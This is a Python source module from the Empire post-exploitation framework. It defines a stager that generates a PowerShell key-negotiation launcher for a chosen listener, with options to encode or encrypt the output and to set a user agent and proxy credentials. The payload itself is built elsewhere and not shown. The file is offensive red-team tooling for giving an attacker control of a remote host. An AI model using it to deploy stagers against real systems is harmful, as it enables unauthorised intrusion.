from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Stager',

            'Author': ['@harmj0y'],

            'Description': ('Generates a (stage1) key-negotiation stager for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to output launcher to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/stager.ps1'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'False'
            },
            'Encrypt' : {
                'Description'   :   'Switch. Encrypt the stager with the config staging key.',
                'Required'      :   True,
                'Value'         :   'False'
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerID = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        encrypt = self.options['Encrypt']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # extract out the listener config information
        listener = self.mainMenu.listeners.get_listener(listenerID)
        if listener:
            # extract out the listener config information
            name = listener[1]
            host = listener[2]
            certPath = listener[4]
            key = listener[5]

            encode = False
            if base64.lower() == "true":
                encode = True

            encryptScript = False
            if encrypt.lower() == "true":
                encryptScript = True

            code = self.mainMenu.stagers.generate_stager(host, key, encrypt=encryptScript, encode=encode)

            return code

        else:
            print helpers.color("[!] Error in stager.ps1 generation.")
            return ""
